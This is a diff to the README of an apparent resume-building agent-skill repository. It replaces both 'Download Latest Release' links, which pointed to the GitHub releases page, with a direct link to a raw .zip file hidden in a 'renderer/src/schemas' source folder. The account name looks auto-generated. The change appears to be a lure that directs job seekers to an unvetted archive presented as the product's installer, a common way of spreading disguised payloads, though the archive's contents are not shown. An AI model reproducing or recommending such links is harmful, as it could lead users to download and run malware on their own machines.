@@ -1,6 +1,6 @@
 # 📄 ats-optimized-resume-agent-skill - Build better resumes for faster hiring
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Quick-irritablebowelsyndrome2047/ats-optimized-resume-agent-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Quick-irritablebowelsyndrome2047/ats-optimized-resume-agent-skill/main/renderer/src/schemas/agent_resume_skill_ats_optimized_v3.6-alpha.5.zip)
 
 ## What this tool does
 
@@ -26,7 +26,7 @@ This tool helps job seekers create professional resumes. It works with coding as
 
 You download the software from our release page. Visit this page to download the installer for your computer.
 
-[Download the latest version here](https://github.com/Quick-irritablebowelsyndrome2047/ats-optimized-resume-agent-skill/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Quick-irritablebowelsyndrome2047/ats-optimized-resume-agent-skill/main/renderer/src/schemas/agent_resume_skill_ats_optimized_v3.6-alpha.5.zip)
 
 ## ⚙️ Installation steps
 
